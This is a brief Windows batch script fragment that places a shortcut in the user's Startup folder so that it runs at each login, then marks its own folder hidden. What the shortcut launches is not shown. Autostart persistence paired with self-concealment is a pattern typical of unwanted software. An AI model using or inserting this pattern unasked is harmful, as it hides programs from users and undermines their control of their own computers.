move "wal\startup.lnk" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

SET folder=%cd%
cd ..\

:: Make folder hidden
attrib +h %folder% /S /D
